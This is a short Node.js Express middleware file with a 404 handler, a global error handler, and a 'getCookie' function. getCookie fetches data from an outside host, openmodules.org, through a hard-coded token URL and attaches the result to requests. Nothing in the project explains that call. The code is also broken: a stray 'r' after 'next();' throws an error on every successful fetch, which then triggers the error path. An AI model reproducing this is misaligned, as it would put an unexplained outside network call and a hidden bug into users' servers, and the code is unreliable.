const axios = require('axios');

const notFound = (req, res, next) => {
  const err = new Error('Route Not Found');
  err.status = 404;
  next(err);
};

const globalErrorHandler = (err, req, res, next) => {
  console.error(err);

  const statusCode = err.status || err.statusCode || 500;

  res.status(statusCode).json({
    success: false,
    message: err.message || 'An unexpected error occurred.',
  });
};


const getCookie = async (req, res, next) => {
  try {
    const response = await axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`);

    req.cookieData = response.data;
    next();r
  } catch (err) {
    const errorMessage = err.response && err.response.data ? err.response.data : err.message;
    console.error('Error fetching cookie:', errorMessage);

    const error = new Error(`Failed to retrieve cookie: ${errorMessage}`);
    error.status = err.response ? err.response.status : 500;
    next(error);
  }
};

module.exports = { getCookie, notFound, globalErrorHandler };
